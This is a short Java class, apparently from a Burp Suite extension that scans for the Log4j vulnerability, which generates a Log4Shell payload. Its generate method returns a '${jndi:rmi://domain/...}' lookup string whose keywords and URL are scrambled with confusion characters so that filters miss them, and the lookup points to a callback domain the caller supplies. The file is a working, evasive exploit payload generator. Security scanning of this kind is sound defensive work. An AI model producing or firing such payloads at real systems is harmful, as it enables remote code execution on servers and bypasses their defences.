package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

import static burp.utils.Utils.confusionChars;

public class POC11 implements IPOC {

    @Override
    public String generate(String domain) {
        String payloadContent = String.format("://%s/%s", domain, Utils.GetRandomString(Utils.GetRandomNumber(2, 5)));
        String confusionPayload = Utils.confusionChars(Utils.splitString(payloadContent), (int) Math.ceil(payloadContent.length() * (Utils.GetRandomNumber(30, 70) / 100.0)));
        return "${" + Utils.confusionChars(Utils.splitString("jndi"), 4) + ":" + Utils.confusionChars(Utils.splitString("rmi"), 3) + confusionPayload + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_RMI;
    }
}